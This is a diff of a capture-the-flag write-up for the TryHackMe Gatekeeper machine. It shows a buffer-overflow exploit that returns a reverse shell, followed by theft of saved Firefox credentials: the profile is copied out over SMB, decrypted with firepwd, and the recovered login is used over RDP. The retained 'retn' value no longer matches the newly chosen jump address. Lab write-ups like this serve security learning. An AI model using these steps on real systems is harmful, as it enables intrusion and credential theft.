@@ -157,7 +157,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.109 LPORT=9822 EXITFUNC=th
 
 Let's paste this in the `payload` variable of our script and add 10 NOP chars in each `padding` and `postfix`. But we also need to find a jump point. 
 
-After some manual searching, I found a `jmp esp` call in a `mswsock.dll` file at the address: `6D930813`, which will be rewritten in little endian as `\x13\x08\x93\x6d` and pasted into the `retn` variable of our exploit script:
+```
+ERC --SearchMemory FF E4
+```
+
+It found a number of jump points, but I chose the following one: `0x080414C3`. Let's rewrite it in little endian and add it to the retn variable.
 
 ```
 retn = \x13\x08\x93\x6d
@@ -181,4 +185,111 @@ C:\Users\windows\Desktop\gatekeeper>
 It returned a shell on my local machine. Now I will try the same thing for the TryHackMe machine:
 
 ```
+listening on [any] 80 ...
+connect to [10.11.100.243] from (UNKNOWN) [10.10.94.199] 49203
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\natbat\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\Desktop
+
+05/14/2020  08:24 PM    <DIR>          .
+05/14/2020  08:24 PM    <DIR>          ..
+04/21/2020  04:00 PM             1,197 Firefox.lnk
+04/20/2020  12:27 AM            13,312 gatekeeper.exe
+04/21/2020  08:53 PM               135 gatekeeperstart.bat
+05/14/2020  08:43 PM               140 user.txt.txt
+               4 File(s)         14,784 bytes
+               2 Dir(s)  15,885,426,688 bytes free
+
+C:\Users\natbat\Desktop>type user.txt.txt
+type user.txt.txt
+{H4lf_W4y_Th3r3}
+
+The buffer overflow in this room is credited to Justin Steven and his
+"dostackbufferoverflowgood" program.  Thank you!
+```
+
+Alright, now we need to escalate privileges to be able to see the root flag. 
+
+> I looked around for some common PrivEsc sequences on Windows, but couldn't find anything. With the help of this [write-up](https://ronamosa.io/docs/hacker/tryhackme/gatekeeper/) I made it work:
+
+So apparently there's a Firefox shortcut on desktop:
+
+```
+C:\Users\natbat\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\Desktop
+
+05/14/2020  08:24 PM    <DIR>          .
+05/14/2020  08:24 PM    <DIR>          ..
+04/21/2020  04:00 PM             1,197 Firefox.lnk
+04/20/2020  12:27 AM            13,312 gatekeeper.exe
+04/21/2020  08:53 PM               135 gatekeeperstart.bat
+05/14/2020  08:43 PM               140 user.txt.txt
+               4 File(s)         14,784 bytes
+               2 Dir(s)  15,751,954,432 bytes free
+```
+
+Apparently, this is where you find Firefox profiles on Windows:
+
+```
+ Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles
+
+04/21/2020  04:00 PM    <DIR>          .
+04/21/2020  04:00 PM    <DIR>          ..
+05/14/2020  09:45 PM    <DIR>          ljfn812a.default-release
+04/21/2020  04:00 PM    <DIR>          rajfzh3y.default
+               0 File(s)              0 bytes
+               4 Dir(s)  15,896,350,720 bytes free
+```
+
+In the `ljfn812a.default-release` there is a `logins.json` file, which contains the following:
+
+```
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>type logins.json
+type logins.json
+{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
+```
+
+Which means, all we need to do really, is grab the encrypted credentials and decrypt them. So I copied them to the SMB share where we initially found `gatekeeper.exe`:
+
+```
+C:\Users\Share>xcopy "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles" "C:\Users\Share" /E /I /H /Y
+```
+
+Now we can navigate to that share and download these files:
+
+```
+smb: \Share\ljfn812a.default-release\> mget *
+```
+
+Now we need to use this to decrypt it:
+
+```
+git clone https://github.com/lclevy/firepwd.git
+python3 firepwd.py -d ../ljfn812a.default-release
+```
+
+The output is long but the last line is what matters:
+
+```
+decrypting login/password pairs
+   https://creds.com:b'mayor',b'8CL***IsV'
+```
+
+Let's use them to see the root flag:
+
+```
+xfreerdp /u:mayor /p:8CL***IsV /v:$targ3t
+```
+
+The root flag is right there on the desktop in the file `root.txt`!
 
